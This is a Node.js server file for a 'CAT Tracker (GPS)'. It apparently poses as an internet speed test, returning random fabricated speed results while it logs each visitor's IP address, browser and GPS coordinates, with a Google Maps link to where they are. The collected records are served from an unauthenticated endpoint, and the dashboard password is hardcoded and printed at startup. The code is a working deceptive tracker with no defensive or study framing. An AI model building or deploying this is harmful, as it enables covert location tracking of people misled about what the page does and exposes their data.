const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.get('/dashboard', (req, res) => {
    res.sendFile(__dirname + '/public/dashboard.html');
});

app.post('/api/track', (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || req.ip;
    const ua = req.headers['user-agent'] || 'unknown';
    
    // Get GPS data from request body (sent by frontend)
    const { gps_lat, gps_lon, gps_accuracy } = req.body;
    
    console.log('📡 New visitor:', ip);
    console.log('🖥 User-Agent:', ua);
    
    if (gps_lat && gps_lon) {
        console.log('📍 GPS Coordinates:', gps_lat, gps_lon);
        console.log('🎯 Accuracy:', gps_accuracy, 'meters');
        console.log('🗺️ Google Maps: https://www.google.com/maps?q=' + gps_lat + ',' + gps_lon);
    } else {
        console.log('📍 GPS: Not available (user denied or not supported)');
    }
    
    res.json({
        status: 'ok',
        download: (Math.random() * 150 + 30).toFixed(2),
        upload: (Math.random() * 60 + 10).toFixed(2),
        ping: (Math.random() * 40 + 5).toFixed(0),
        server: 'Local Node',
        ip: ip,
        userAgent: ua,
        gps_lat: gps_lat || null,
        gps_lon: gps_lon || null,
        gps_accuracy: gps_accuracy || null
    });
});

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    res.json({ success: password === 'catmaster2026' });
});

// Store visitors in memory (resets on server restart)
let visitors = [];

app.post('/api/visitors', (req, res) => {
    const data = req.body;
    visitors.unshift({
        ...data,
        timestamp: new Date().toISOString()
    });
    // Keep only last 100 visitors
    if (visitors.length > 100) visitors = visitors.slice(0, 100);
    res.json({ success: true });
});

app.get('/api/visitors', (req, res) => {
    res.json(visitors);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('✅ CAT Tracker (GPS) running on port', PORT);
    console.log('📊 Dashboard: http://0.0.0.0:' + PORT + '/dashboard');
    console.log('🔑 Password: catmaster2026');
});
